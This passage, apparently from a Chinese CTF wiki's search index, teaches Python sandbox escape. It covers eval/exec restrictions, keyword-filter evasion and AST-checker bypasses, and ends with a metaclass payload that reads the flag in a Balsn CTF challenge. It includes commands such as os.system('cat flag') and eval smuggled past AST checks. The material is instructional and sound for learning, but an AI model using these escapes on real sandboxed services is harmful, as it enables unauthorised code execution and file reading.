for name , value in class_attr . items () if not name . startswith ( '__' )) class_attr = dict (( 'IWant' + name . upper () + 'Plz' , value ) for name , value in attrs ) newclass = super () . __new__ ( cls , class_name , class_parents , class_attr ) return newclass def __init__ ( * argv ): print ( 'Bad guy! No Flag !!' ) raise 'Illegal' class BalsnMetaClass ( type ): def getFlag ( self ): print ( 'You \\' re not Master! No Flag !!' ) def __new__ ( cls , class_name , class_parents , class_attr ): newclass = super () . __new__ ( cls , class_name , class_parents , class_attr ) setattr ( newclass , cls . getFlag . __name__ , cls . getFlag ) return newclass def secure_vars ( s ): attrs = { name : value for name , value in vars ( s ) . items () if not name . startswith ( '__' )} return attrs safe_dict = { 'BalsnMetaClass' : BalsnMetaClass , 'MasterMetaClass' : MasterMetaClass , 'False' : False , 'True' : True , 'abs' : abs , 'all' : all , 'any' : any , 'ascii' : ascii , 'bin' : bin , 'bool' : bool , 'bytearray' : bytearray , 'bytes' : bytes , 'chr' : chr , 'complex' : complex , 'dict' : dict , 'dir' : dir , 'divmod' : divmod , 'enumerate' : enumerate , 'filter' : filter , 'float' : float , 'format' : format , 'hash' : hash , 'help' : help , 'hex' : hex , 'id' : id , 'int' : int , 'iter' : iter , 'len' : len , 'list' : list , 'map' : map , 'max' : max , 'min' : min , 'next' : next , 'oct' : oct , 'ord' : ord , 'pow' : pow , 'print' : print , 'range' : range , 'reversed' : reversed , 'round' : round , 'set' : set , 'slice' : slice , 'sorted' : sorted , 'str' : str , 'sum' : sum , 'tuple' : tuple , 'type' : type , 'vars' : secure_vars , 'zip' : zip , '__builtins__' : None } def createMethod ( code ): # if len(code) > 45: # print('Too long!! Bad Guy!!') # return for x in ' _$#@~' : code = code . replace ( x , '' ) def wrapper ( self ): exec ( code , safe_dict , { 'self' : self }) return wrapper def setName ( pattern ): while True : name = input ( f 'Give me your { pattern } name :' ) if ( name . isalpha ()): break else : print ( 'Illegal Name...' ) return name def setAttribute ( cls ): attrName = setName ( 'attribute' ) while True : attrValue = input ( f 'Give me your value:' ) if ( attrValue . isalnum ()): break else : print ( 'Illegal value...' ) setattr ( cls , attrName , attrValue ) def setMethod ( cls ): methodName = setName ( 'method' ) code = input ( f 'Give me your function:' ) func = createMethod ( code ) setattr ( cls , methodName , func ) def getAttribute ( obj ): attrs = [ attr for attr in dir ( obj ) if not callable ( getattr ( obj , attr )) and not attr . startswith ( \"__\" )] x = input ( 'Please enter the attribute \\' s name :' ) if x not in attrs : print ( f 'You can \\' t access the attribute { x } ' ) return else : try : print ( f ' { x } : { getattr ( obj , x ) } ' ) except : print ( \"Something went wrong in your attribute...\" ) return def callMethod ( cls , obj ): attrs = [ attr for attr in dir ( obj ) if callable ( getattr ( obj , attr )) and not attr . startswith ( \"__\" )] x = input ( 'Please enter the method \\' s name :' ) if x not in attrs : print ( f 'You can \\' t access the method { x } ' ) return else : # try: print ( f 'calling method { x } ...' ) cls . __dict__ [ x ]( obj ) print ( 'done' ) # except: # print('Something went wrong in your method...') # return class Guest ( metaclass = BalsnMetaClass ): pass if __name__ == '__main__' : print ( f 'Welcome!!We have prepared a class named \"Guest\" for you' ) cnt = 0 while cnt < 3 : cnt += 1 print ( '1. Add attribute' ) print ( '2. Add method' ) print ( '3. Finish' ) x = input ( \"Option ? :\" ) if x == \"1\" : setAttribute ( Guest ) elif x == \"2\" : setMethod ( Guest ) elif x == \"3\" : break else : print ( \"invalid input.\" ) cnt -= 1 print ( \"Well Done! We Create an instance for you !\" ) obj = Guest () cnt = 0 while cnt < 3 : cnt += 1 print ( '1. Inspect attribute' ) print ( '2. Using method' ) print ( '3. Exit' ) x = input ( \"Option ? :\" ) if x == \"1\" : getAttribute ( obj ) elif x == \"2\" : callMethod ( Guest , obj ) elif x == \"3\" : print ( \"Okay...exit...\" ) break else : print ( \"invalid input.\" ) cnt -= 1 \u4e3b\u8981\u76ee\u6807\u662f\u521b\u5efa\u4e00\u4e2a MasterMetaClass \u7684\u5b9e\u4f8b\u4f46\u4e0d\u8c03\u7528\u5b83\u7684 __init__\u3002\u5e76\u4e14 method method \u9650\u5236\u4e86\u957f\u5ea6 <=45\uff0c\u800c\u4e14 ' \uff08\u7a7a\u683c\uff09_$#@~ ' \u90fd\u4f1a\u88ab\u5220\u6389\uff0c\u5185\u90e8 exec \u7684 globals \u4e5f\u7ed9\u4e86\u9650\u5236 \u76f4\u63a5\u8c03\u7528 MasterMetaClass \u6765\u5b9e\u4f8b\u5316\u4f1a\u6267\u884c __call__ \u548c __init__\uff0c\u76f4\u63a5\u8c03\u7528 __new__ \u53c8\u4f1a\u88ab\u9650\u5236\u4e0d\u80fd\u8f93\u5165\u4e0b\u5212\u7ebf \u521b\u5efa\u4e00\u4e2a\u5143\u7c7b\u53ef\u4ee5\u4f7f\u7528 type(name, bases, dict) \uff0c\u8fd4\u56de\u503c\u662f\u4e00\u4e2a\u7c7b\uff0c\u53c2\u6570\u662f\uff1a name : It is a string which basically represents the name of the class . bases : It is a tuple that specifies the base classes of the main class . dict : It is a \u2018 dictionary \u2018 that is used to create body of the class specified. \u6240\u4ee5\u76f4\u63a5\u4f7f\u7528 type \u521b\u5efa\u4e00\u4e2a\u65b0\u7684 metaclass\uff0c\u8ba9\u5b83\u57fa\u4e8e\uff08\u4e5f\u5c31\u662f bases \u53c2\u6570\u5185\u5bb9\uff09MasterMetaClass\uff0c\u5e76\u4e14\u8986\u76d6\u6389\u5b83\u7684 __init__\uff0c\u6240\u4ee5\u6700\u7ec8\u7684 payload \u53ef\u4ee5\u6839\u636e\u8fd9\u4e2a\u6765\u6539\u5199\uff1a type ( \"\" , ( MasterMetaClass ,), { \"__init__\" : print })( \"\" ,(),{}) . IWantGETFLAGPlz ( 1 ) \u56e0\u4e3a\u8fd9\u65f6\u7684\u4e0b\u5212\u7ebf\u5728\u5f15\u53f7\u4e2d\uff0c\u6240\u4ee5\u53ef\u4ee5\u4f7f\u7528 \"\\x5f\" \u6765\u4ee3\u66ff payload add method x : e = \" \\x5f \" * 2 ; self . d = { e + \"init\" + e : print } add method y : self . m = type ( '' ,( MasterMetaClass ,), self . d ) add method z : self . m ( '' ,(),{}) . IWantGETFLAGPlz ( 1 ) call x call y call z Reference \u00b6 TokyoWesterns CTF 4th 2018 Writeup \u2014 Part 5 Documentation of ast \u4e00\u6587\u770b\u61c2Python\u6c99\u7bb1\u9003\u9038 - FreeBuf\u7f51\u7edc\u5b89\u5168\u884c\u4e1a\u95e8\u6237 https://blog.gztime.cc/posts/2021/83a30666/","title":"Python \u6c99\u7bb1\u9003\u9038"},{"location":"ctf/escapes/pysandbox/#python","text":"","title":"Python \u6c99\u7bb1\u9003\u9038"},{"location":"ctf/escapes/pysandbox/#_1","text":"Python \u91cc\u7684 eval \u548c exec \u53ef\u4ee5\u7528\u6765\u6267\u884c\u4e00\u4e9b\u4ee3\u7801\u6765\u5e72\u574f\u4e8b \u4f46\u662f\u9898\u76ee\u90fd\u4f1a\u7ed9\u4e00\u4e9b\u5947\u5947\u602a\u602a\u7684\u3001\u770b\u8d77\u6765\u4e25\u5bc6\u7684\u9650\u5236\u9632\u6b62\u5e72\u574f\u4e8b \u8fd9\u65f6\u5019\u5c31\u8981\u627e\u65b9\u6cd5\u7ed5\u8fc7\u9650\u5236\u6765\u5e72\u574f\u4e8b\uff0c\u4e5f\u5c31\u662f\u6c99\u7bb1\u9003\u9038","title":"\u4e3a\u4ec0\u4e48\u9003\u9038\uff1f"},{"location":"ctf/escapes/pysandbox/#eval-exec","text":"eval ( expression [, globals [, locals ]]) exec ( expression [, globals [, locals ]]) \u53ef\u4ee5\u770b\u51fa\u5b83\u4eec\u7684\u7528\u6cd5\u5927\u4f53\u76f8\u4f3c\uff0c\u53c2\u6570\u6709\u8981\u6267\u884c\u7684\u8868\u8fbe\u5f0f expression \uff0c\u5168\u5c40\u53d8\u91cf globals \uff08\u5fc5\u987b\u662f\u5b57\u5178\uff09\uff0c\u5c40\u90e8\u53d8\u91cf locals \uff08\u4efb\u610f mapping object\uff0c\u4e00\u822c\u4e5f\u662f\u5b57\u5178\uff09 \u4e0d\u540c\u7684\u662f eval \u628a\u8868\u8fbe\u5f0f\u8ba1\u7b97\u51fa\u6765\uff0c\u628a\u7ed3\u679c\u8fd4\u56de\uff0c\u5e76\u4e0d\u4f1a\u5f71\u54cd\u5f53\u524d\u73af\u5883 \u800c exec \u628a\u8868\u8fbe\u5f0f\u4f5c\u4e3apy\u8bed\u53e5\u6765\u6267\u884c\uff0c\u53ef\u4ee5\u8fdb\u884c\u8d4b\u503c\u7b49\u64cd\u4f5c\uff08\u9898\u76ee\u91cc exec \u4e0d\u5e38\u89c1\uff09","title":"eval \u548c exec \u6709\u4ec0\u4e48\u533a\u522b"},{"location":"ctf/escapes/pysandbox/#eval-exec_1","text":"\u53ef\u4ee5\u770b\u51fa\uff0ceval \u548c exec \u90fd\u5305\u542b\u53c2\u6570 globals locals\uff0c\u53ef\u4ee5\u6307\u5b9a\u5b83\u4eec\u4e3a\u7a7a\u5b57\u5178\u4f7f\u5176\u8bbf\u95ee\u4e0d\u5230\u5168\u5c40\u53d8\u91cf\u548c\u5c40\u90e8\u53d8\u91cf \u800c\u6bd4\u8f83\u7279\u522b\u7684\u5c31\u662f __builtins__ \uff0c\u5373\u5185\u7f6e\u51fd\u6570\u3002\u5982\u679c globals \u4e2d\u6ca1\u6709\u952e builtins \uff0c\u5219\u4f1a\u81ea\u52a8\u5c06\u5176\u63d2\u5165\uff0c\u800c\u770b\u6587\u6863 https://docs.python.org/3/library/functions.html \u53ef\u4ee5\u53d1\u73b0\u5176\u4e2d\u6709\u51fd\u6570 open \u548c __import__ \u53ef\u4ee5\u7528\u6765\u5e72\u574f\u4e8b\uff0c\u6240\u4ee5\u4e00\u822c\u4f1a\u4f20\u5165 globals \u4e3a {'__builtins__': {}} \u4f7f\u5176\u65e0\u6cd5\u4f7f\u7528\u5185\u7f6e\u51fd\u6570","title":"eval \u548c exec \u5982\u4f55\u6784\u9020\u6c99\u7bb1"},{"location":"ctf/escapes/pysandbox/#astliteral_eval","text":"\u5373\u4f7f eval \u548c exec \u7ed9\u4e86\u8fd9\u6837\u7684\u9650\u5236\uff0c\u90a3\u80af\u5b9a\u8fd8\u662f\u4f1a\u6709\u6f0f\u6d1e\u7684\uff08\u4e0d\u7136\u5c31\u6ca1\u8fd9\u7bc7\u6587\u7ae0\u4e86\uff09 \u90a3\u6709\u6ca1\u6709\u66f4\u5b89\u5168\u7684 eval\uff1f ast \u6a21\u5757\u4e2d\u7684 literal_eval \u5c31\u4f1a\u66f4\u52a0\u5b89\u5168\uff0c\u76ee\u524d\u8c8c\u4f3c\u5e76\u65e0\u7a81\u7834\u65b9\u6cd5\uff0c\u6240\u4ee5\u9898\u76ee\u91cc\u662f ast.literal_eval \u57fa\u672c\u4e0a\u5c31\u4e0d\u662f\u6c99\u7bb1\u9003\u9038\u4e86_(:\u0437\u300d\u2220)_","title":"ast.literal_eval"},{"location":"ctf/escapes/pysandbox/#_2","text":"","title":"\u600e\u4e48\u9003\u9038\uff1f"},{"location":"ctf/escapes/pysandbox/#expression-eval","text":"\u8fd9\u65f6\u53ea\u8981\u7ed5\u8fc7 expression \u7684\u9650\u5236\u5c31\u53ef\u4ee5\u4e86 \u6bd4\u5982\u8fc7\u6ee4\u4e86 system\u3001open\u3001ls\u3001cat \u7b49\u654f\u611f\u8bcd \u8fd9\u6837\u53ef\u4ee5\u7528\u5b57\u7b26\u4e32\u62fc\u63a5\uff0c\u6216\u8005\u628a bytes decode \u6210\u5b57\u7b26\u4e32\u6765\u7ed5\u8fc7 \u4e5f\u53ef\u4ee5\u7528\u73b0\u6709\u5b57\u7b26\u4e32\uff08 ?.__doc__ \uff09\u901a\u8fc7\u7d22\u5f15\u6765\u62fc\u63a5\u6210\u9700\u8981\u7684\u5b57\u7b26\u4e32 \u5982\u679c\u662f\u8fc7\u6ee4\u4e86\u6570\u5b57\u7684\u8bdd\u5219\u53ef\u4ee5\u7528 True\u3001False \uff08\u6216 []==[]\u3001[]<[] \uff09\u6765\u52a0\u51cf\u4e58\u9664\u5f00\u65b9\u79fb\u4f4d\u5f97\u5230\u6570\u5b57","title":"\u4ec5\u68c0\u67e5\u4e86 expression\uff0c\u4f46 eval \u6ca1\u6709\u9650\u5236"},{"location":"ctf/escapes/pysandbox/#import","text":"\u53ef\u4ee5\u7528 __import__ \u6765\u624b\u52a8 import\uff0c\u5177\u4f53\uff1a __import__(package) \u5f97\u5230\u7684\u5c31\u662f\u8fd9\u4e2apackage\u3001\u6216\u8005\u7528 importlib.import_module \u6765\u5bfc\u5165\u4e00\u4e2a\u5305 __import__ ( os ) . system ( \"cat flag\" ) importlib . import_module ( \"os\" ); os . system ( \"cat flag\" )","title":"\u6ca1\u6709 import"},{"location":"ctf/escapes/pysandbox/#__builtins__","text":"\u53ef\u4ee5\u5c1d\u8bd5\u7528 imp.reload \u6216 importlib.reload \u6765\u91cd\u65b0\u5bfc\u5165 __builtins__","title":"\u4ec5\u6e05\u7a7a\u4e86 __builtins__"},{"location":"ctf/escapes/pysandbox/#eval","text":"","title":"eval \u628a\u73af\u5883\u6e05\u7a7a\u4e86"},{"location":"ctf/escapes/pysandbox/#ast","text":"\u5177\u4f53\u76f8\u5bf9\u590d\u6742\uff0c\u5355\u72ec\u5217\u51fa\u4e00\u6761\uff0c\u89c1\u4e0b\u9762","title":"\u7ed5\u8fc7 AST \u68c0\u6d4b"},{"location":"ctf/escapes/pysandbox/#ast_1","text":"\u8fd9\u7c7b\u9898\u76ee\u4e0d\u50cf\u666e\u901a\u7684\u6c99\u7bb1\u9003\u9038\u4e00\u6837\u901a\u8fc7\u5220\u9664\u5185\u7f6e\u51fd\u6570\u5b57\u5178\u6216\u8005\u5220\u9664\u67d0\u4e9b\u6a21\u5757\u7684\u5185\u5bb9\u6765\u5b9e\u73b0 \u800c\u662f\u5728\u8f93\u5165\u547d\u4ee4\u540e\u5373\u4f7f\u7528python\u7684 ast \u6a21\u5757\u5bf9\u5176\u8fdb\u884c\u8bed\u6cd5\u5206\u6790\uff0c\u53ea\u8981\u4f7f\u7528\u4e86\u67d0\u4e9b\u7981\u6b62\u7684\u62bd\u8c61\u8bed\u6cd5\uff0c\u5c31\u629b\u51fa\u5f02\u5e38\u5bfc\u81f4\u7a0b\u5e8f\u4e2d\u65ad \u56e0\u4e3a\u5b83\u76f4\u63a5\u4f7f\u7528 ast.parse \u5206\u6790\u4e86\u8bed\u6cd5\uff0c\u6240\u4ee5\u5f88\u96be\u8499\u6df7\u8fc7\u5173\u9a97\u8fc7 ast\uff0c\u8fd9\u65f6\u5c31\u9700\u8981\u5bfb\u627e\u9898\u76ee\u4e2d\u904d\u5386\u8bed\u6cd5\u6811\u7684\u6f0f\u6d1e\u4e86 \u5148\u6765\u770b\u770b cy \u7684 pysandbox13\uff0c\u8fd9\u4e2a\u6700\u7ec8\u7248\u7684 AST \u68c0\u67e5\u7ed5\u8fc7 \u9898\u76ee\u4ee3\u7801 dbgprint = sys . stderr . write class Traversal (): def __init__ ( self , node ): self . tisiv ( node ) depth = - 1 def tisiv ( self , nodes ): if not isinstance ( nodes , list ): nodes = [ nodes ] self . depth += 1 for node in nodes : func = getattr ( self , 'tisiv_' + node . __class__ . __name__ , None ) if func : dbgprint ( \" \" * self . depth + \"tisiv\" [:: - 1 ] + \" \\t \" + node . __class__ . __name__ + \" \\n \" ) return func ( node ) else : if not isinstance ( node , ast . expr ): raise Exception ( \"not allowed \" + str ( node )) self . depth -= 1 def tisiv_Call ( self , node ): raise Exception ( \"not allowed\" ) self . tisiv ( node . func ) self . tisiv ( node . args ) self . tisiv ( node . keywords ) def tisiv_Attribute ( self , node ): raise Exception ( \"not allowed\" ) self . tisiv ( node . value ) self . tisiv ( node . attr ) self . tisiv ( node . ctx ) def tisiv_Import ( self , node ): raise Exception ( \"not allowed\" ) def tisiv_Module ( self , node ): self . tisiv ( node . body ) def tisiv_BoolOp ( self , node ): self . tisiv ( node . values ) def tisiv_BinOp ( self , node ): self . tisiv ( node . left ) self . tisiv ( node . right ) def tisiv_UnaryOp ( self , node ): self . tisiv ( node . operand ) def tisiv_Lambda ( self , node ): self . tisiv ( node . body ) self . tisiv ( node . args ) def tisiv_IfExp ( self , node ): self . tisiv ( node . test ) self . tisiv ( node . body ) self . tisiv ( node . orelse ) def tisiv_Dict ( self , node ): self . tisiv ( node . keys ) self . tisiv ( node . values ) def tisiv_Set ( self , node ): self . tisiv ( node . elts ) def tisiv_ListComp ( self , node ): self . tisiv ( node . elt ) self . tisiv ( node . generators ) def tisiv_SetComp ( self , node ): self . tisiv ( node . elt ) self . tisiv ( node . generators ) def tisiv_DictComp ( self , node ): self . tisiv ( node . key ) self . tisiv ( node . value ) self . tisiv ( node . generators ) def tisiv_GeneratorExp ( self , node ): self . tisiv ( node . elt ) self . tisiv ( node . generators ) def tisiv_Yield ( self , node ): self . tisiv ( node . value ) def tisiv_Compare ( self , node ): self . tisiv ( node . left ) self . tisiv ( node . comparators ) def tisiv_Repr ( self , node ): self . tisiv ( node . value ) def tisiv_Subscript ( self , node ): self . tisiv ( node . value ) self . tisiv ( node . slice ) def tisiv_List ( self , node ): self . tisiv ( node . elts ) def tisiv_Tuple ( self , node ): self . tisiv ( node . elts ) def tisiv_Expr ( self , node ): self . tisiv ( node . value ) def tisiv_JoinedStr ( self , node ): self . tisiv ( node . values ) def tisiv_NameConstant ( self , node ): pass Traversal ( ast . parse ( c )) \u53ef\u4ee5\u8bfb\u51fa\uff0c\u5b83\u5b9a\u4e49\u4e86\u4e00\u4e2a Traversal \u7c7b\uff0c\u5728\u521d\u59cb\u5316\u7684\u65f6\u5019\u5bf9\u4f20\u5165\u7684\u8282\u70b9\u8c03\u7528 tisiv \u65b9\u6cd5\uff0c\u5373\u5bf9\u5176\u6240\u6709\u5b50\u8282\u70b9\u7ee7\u7eed\u9010\u5c42\u68c0\u67e5 \u5982\u679c tisiv_{\u8be5\u8282\u70b9\u7c7b\u540d} \u5df2\u7ecf\u6709\u4e86\u5b58\u5728\u7684\u65b9\u6cd5\uff0c\u5c31\u8c03\u7528\u5b83\uff0c\u5728\u90a3\u4e9b\u65b9\u6cd5\u4e2d\u53c8\u5206\u522b\u5bf9\u5176\u5b50\u8282\u70b9\u8fdb\u884c\u4e86\u68c0\u67e5 \u5982\u679c\u4e0d\u5b58\u5728\u8fd9\u6837\u7684\u65b9\u6cd5\uff0c\u5c31\u68c0\u6d4b\u8fd9\u4e2a\u8282\u70b9\u7684\u8bed\u6cd5\u7c7b\u578b\u662f\u4e0d\u662f ast.expr\uff0c\u5982\u679c\u4e0d\u662f\u5c31\u76f4\u63a5\u7981\u6b62 \u518d\u770b TokyoWesterns CTF 4th 2018 \u7684\u4e00\u9053\u9898\uff1a \u9898\u76ee\u4ee3\u7801 def check ( node ): if isinstance ( node , list ): return all ([ check ( n ) for n in node ]) else : attributes = { 'BoolOp' : [ 'values' ], 'BinOp' : [ 'left' , 'right' ], 'UnaryOp' : [ 'operand' ], 'Lambda' : [ 'body' ], 'IfExp' : [ 'test' , 'body' , 'orelse' ], 'Dict' : [ 'keys' , 'values' ], 'Set' : [ 'elts' ], 'ListComp' : [ 'elt' , 'generators' ], 'SetComp' : [ 'elt' , 'generators' ], 'DictComp' : [ 'key' , 'value' , 'generators' ], 'GeneratorExp' : [ 'elt' , 'generators' ], 'Yield' : [ 'value' ], 'Compare' : [ 'left' , 'comparators' ], 'Call' : False , # call is not permitted 'Repr' : [ 'value' ], 'Num' : True , 'Str' : True , 'Attribute' : False , # attribute is also not permitted 'Subscript' : [ 'value' ], 'Name' : True , 'List' : [ 'elts' ], 'Tuple' : [ 'elts' ], 'Expr' : [ 'value' ], # root node 'comprehension' : [ 'target' , 'iter' , 'ifs' ], } for k , v in attributes . items (): if hasattr ( ast , k ) and isinstance ( node , getattr ( ast , k )): if isinstance ( v , bool ): return v return all ([ check ( getattr ( node , attr )) for attr in v ]) if __name__ == '__main__' : expr = sys . stdin . readline () body = ast . parse ( expr ) . body \u8fd9\u9053\u9898\u76ee\u7684\u4ee3\u7801\u5c31\u66f4\u52a0\u660e\u786e\u4e86\uff0c\u9053\u7406\u662f\u7c7b\u4f3c\u7684 \u6b63\u5982\u524d\u9762\u8bf4\u7684\uff0c\u6211\u4eec\u9700\u8981\u627e\u68c0\u67e5\u7a0b\u5e8f\u4e2d\u7684\u6f0f\u6d1e","title":"\u7ed5\u8fc7 AST \u68c0\u6d4b\u9003\u9038"},{"location":"ctf/escapes/pysandbox/#_4","text":"\u6211\u4eec\u53d1\u73b0\uff0c\u5728\u9898\u76ee\u7684\u7a0b\u5e8f\u4e2d\uff0c\u90fd\u662f\u624b\u52a8\u7f16\u5199\u4e86\u5bf9\u67d0\u4e2a\u62bd\u8c61\u8bed\u6cd5\u7684\u54ea\u4e9b\u90e8\u5206\u8fdb\u884c\u68c0\u6d4b\uff0c\u6240\u4ee5\u53ef\u80fd\u5c31\u4f1a\u51fa\u73b0\u67d0\u4e2a\u8bed\u6cd5\u7684\u67d0\u4e2a\u90e8\u5206\u6ca1\u88ab\u68c0\u6d4b\u5230\u7684\u60c5\u51b5\u3002 \u8fd9\u65f6\u5019\u5c31\u53ef\u4ee5\u53bb\u548c AST \u6587\u6863\u4e2d\u62bd\u8c61\u8bed\u6cd5 \u5bf9\u6bd4\uff0c\u6587\u6863\u4e2d\u7ed9\u51fa\u7684 ast.expr \u5305\u542b\u4e86\uff1a expr = BoolOp ( boolop op , expr * values ) | NamedExpr ( expr target , expr value ) | BinOp ( expr left , operator op , expr right ) | UnaryOp ( unaryop op , expr operand ) | Lambda ( arguments args , expr body ) | IfExp ( expr test , expr body , expr orelse ) | Dict ( expr * keys , expr * values ) | Set ( expr * elts ) | ListComp ( expr elt , comprehension * generators ) | SetComp ( expr elt , comprehension * generators ) | DictComp ( expr key , expr value , comprehension * generators ) | GeneratorExp ( expr elt , comprehension * generators ) -- the grammar constrains where yield expressions can occur | Await ( expr value ) | Yield ( expr ? value ) | YieldFrom ( expr value ) -- need sequences for compare to distinguish between -- x < 4 < 3 and (x < 4) < 3 | Compare ( expr left , cmpop * ops , expr * comparators ) | Call ( expr func , expr * args , keyword * keywords ) | FormattedValue ( expr value , int ? conversion , expr ? format_spec ) | JoinedStr ( expr * values ) | Constant ( constant value , string ? kind ) -- the following expression can appear in assignment context | Attribute ( expr value , identifier attr , expr_context ctx ) | Subscript ( expr value , expr slice , expr_context ctx ) | Starred ( expr value , expr_context ctx ) | Name ( identifier id , expr_context ctx ) | List ( expr * elts , expr_context ctx ) | Tuple ( expr * elts , expr_context ctx ) -- can appear only in Subscript | Slice ( expr ? lower , expr ? upper , expr ? step ) \u6bd4\u5982\uff0cBinOp(expr left, operator op, expr right) \u8868\u793a\u4e86\u4e8c\u5143\u8fd0\u7b97\u8fd9\u4e2a\u8bed\u6cd5\uff0cleft \u8868\u793a\u5de6\u4fa7\u7684\u8868\u8fbe\u5f0f\uff0cop \u8868\u793a\u4e8c\u5143\u8fd0\u7b97\u7b26\uff0cright \u8868\u793a\u53f3\u4fa7\u8868\u8fbe\u5f0f\u3002 \u540c\u7406 ListComp(expr elt, comprehension* generators) \u4e2d elt \u8868\u793a\u5176\u4e2d\u5217\u8868\u63a8\u5bfc\u7684\u5143\u7d20\uff0c\u800c generator \u5219\u8868\u793a\u751f\u6210\u5668\u5b50\u53e5 \u518d\u6765\u770b TWCTF \u8fd9\u9053\u9898\uff0c\u5b83\u7684\u68c0\u67e5\u4e2d\u5199\u4e86\uff1a 'Subscript' : [ 'value' ], \u800c\u6587\u6863\u4e2d\u7ed9\u7684\u7d22\u5f15\u8bbf\u95ee\u662f Subscript(expr value, expr slice, expr_context ctx) \u56e0\u6b64\u53ef\u4ee5\u53d1\u73b0\u7a0b\u5e8f\u5e76\u6ca1\u6709\u68c0\u6d4b\u7d22\u5f15\u8bbf\u95ee\u4e2d\u7684\u5207\u7247 slice\uff0c\u8fd9\u6837\u4f8b\u5982 a[...] \u4e2d\u7684 ... \u90e8\u5206\u5c31\u4f1a\u88ab\u5168\u90e8\u5ffd\u7565 \u6240\u4ee5\u5c31\u53ef\u4ee5\u5728[]\u4e2d\u85cf\u4e00\u4e2aeval\u6267\u884c\u6211\u4eec\u60f3\u8981\u7684\u529f\u80fd","title":"\u5bfb\u627e\u6ca1\u6709\u904d\u5386\u5230\u7684\u5b50\u8282\u70b9"},{"location":"ctf/escapes/pysandbox/#_5","text":"\u518d\u6765\u770b zjusec \u8fd9\u9053\u9898\uff0c\u901a\u8fc7\u5bf9\u6bd4\u53ef\u4ee5\u53d1\u73b0\u6240\u6709\u68c0\u6d4b\u7684\u8282\u70b9\u7684\u5b50\u8282\u70b9\u4e5f\u90fd\u904d\u5386\u4e86 \u4f46\u662f\u518d\u7ec6\u770b\u53ef\u4ee5\u53d1\u73b0 FormattedValue \u8fd9\u4e2a\u8282\u70b9\u5e76\u6ca1\u6709\u5728\u9898\u76ee\u4ee3\u7801\u91cc\u51fa\u73b0 \u800c\u4e14 ast.FormattedValue \u5c5e\u4e8e ast.expr\uff0c\u6240\u4ee5\u5b83\u65e2\u4e0d\u4f1a\u88ab\u68c0\u67e5\uff0c\u4e5f\u4e0d\u4f1a\u629b\u51fa\u5f02\u5e38 \u770b\u540d\u5b57\u50cf\u662f f-string \u76f8\u5173\uff0c\u53ef\u4ee5 dump \u4e00\u4e0b\u770b\u770b\uff1a >>> ast . dump ( ast . parse ( \"f' {x} '\" )) \"\"\" Module( body=[ Expr( value=JoinedStr( values=[ FormattedValue( value=Name(id='x', ctx=Load()), conversion=-1, format_spec=None ) ] ) ], type_ignores=[] ) \"\"\" \u53ef\u4ee5\u53d1\u73b0\uff0cf-string \u662f JoinedStr\uff0c\u800c FormattedValue \u662f\u5176\u4e2d\u88ab\u683c\u5f0f\u5316\u7684\u90e8\u5206 \u6240\u4ee5\u5c31\u53ef\u4ee5\u5411 f-string \u7684 {} \u90e8\u5206\u85cf eval \u6765\u5e72\u574f\u4e8b\u4e86","title":"\u5bfb\u627e\u6ca1\u6709\u68c0\u67e5\u7684\u8282\u70b9"},{"location":"ctf/escapes/pysandbox/#_6","text":"\u8fd9\u4e2a\u662f pysandbox12 \u7684\u4e00\u79cd\u89e3\u6cd5 python\u4e2d\u7684\u8bed\u6cd5\u4e0d\u4ec5\u6709 ast.expr \u4e00\u79cd\uff0c\u800c\u4e14\u5f88\u7279\u522b\u7684\u662f\uff0c\u5217\u8868\u63a8\u5bfc ListComp \u7684\u751f\u6210\u5668\u5b50\u53e5\u5e76\u4e0d\u662f ast.expr\uff0c\u800c\u662f ast.comprehension >>> ast . dump ( ast . parse ( \"[x for x in range(n)]\" )) \"\"\" Module( body=[ Expr( value=ListComp( elt=Name(id='x', ctx=Load()), generators=[ comprehension( target=Name(id='x', ctx=Store()), iter=Call( func=Name(id='range', ctx=Load()), args=[Name(id='n', ctx=Load())], keywords=[] ), ifs=[], is_async=0 ) ] ) ) ], type_ignores=[] ) \"\"\" \u4f46\u662f pysandbox13 \u8fd9\u6837\u6392\u9664\u4e86 ast.expr \uff1a if not isinstance ( node , ast . expr ): raise Exception ( \"not allowed \" + str ( node )) \u4f46\u662f12\u9898\u4e2d\u5e76\u6ca1\u6709\uff0c\u6240\u4ee5 ast.comprehension \u8fd9\u4e2a\u7c7b\u578b\u5b8c\u5168\u6ca1\u6709\u88ab\u68c0\u67e5 \u56e0\u6b64\u76f4\u63a5\u5411\u751f\u6210\u5668\u8868\u8fbe\u5f0f\u4e2d\u63d2\u5165\u574f\u4e1c\u897f\u5373\u53ef\uff1a [x for x in [eval(...)]]","title":"\u5176\u4ed6\u6f0f\u6d1e"},{"location":"ctf/escapes/pysandbox/#_7","text":"\u5177\u4f53\u95ee\u9898\u5177\u4f53\u5206\u6790\u4e86","title":"\u5176\u4ed6\u7c7b\u578b\u7684\u9003\u9038"},{"location":"ctf/escapes/pysandbox/#metaclass","text":"Balsn CTF 2021 \u51fa\u4e86\u4e00\u9053\u7c7b\u4f3c\u6c99\u7bb1\u9003\u9038\u7684\u9898\u76ee\uff0c\u4e3b\u8981\u8003\u5bdf\u7684\u662f metaclass \u9898\u76ee\u4ee3\u7801 class MasterMetaClass ( type ): def __new__ ( cls , class_name , class_parents , class_attr ): def getFlag ( self ): print ( 'Here you go, my master' ) with open ( 'flag' ) as f : print ( f . read ()) class_attr [ getFlag . __name__ ] = getFlag attrs = (( name , value ) for name , value in class_attr . items () if not name . startswith ( '__' )) class_attr = dict (( 'IWant' + name . upper () + 'Plz' , value ) for name , value in attrs ) newclass = super () . __new__ ( cls , class_name , class_parents , class_attr ) return newclass def __init__ ( * argv ): print ( 'Bad guy! No Flag !!' ) raise 'Illegal' class BalsnMetaClass ( type ): def getFlag ( self ): print ( 'You \\' re not Master! No Flag !!' ) def __new__ ( cls , class_name , class_parents , class_attr ): newclass = super () . __new__ ( cls , class_name , class_parents , class_attr ) setattr ( newclass , cls . getFlag . __name__ , cls . getFlag ) return newclass def secure_vars ( s ): attrs = { name : value for name , value in vars ( s ) . items () if not name . startswith ( '__' )} return attrs safe_dict = { 'BalsnMetaClass' : BalsnMetaClass , 'MasterMetaClass' : MasterMetaClass , 'False' : False , 'True' : True , 'abs' : abs , 'all' : all , 'any' : any , 'ascii' : ascii , 'bin' : bin , 'bool' : bool , 'bytearray' : bytearray , 'bytes' : bytes , 'chr' : chr , 'complex' : complex , 'dict' : dict , 'dir' : dir , 'divmod' : divmod , 'enumerate' : enumerate , 'filter' : filter , 'float' : float , 'format' : format , 'hash' : hash , 'help' : help , 'hex' : hex , 'id' : id , 'int' : int , 'iter' : iter , 'len' : len , 'list' : list , 'map' : map , 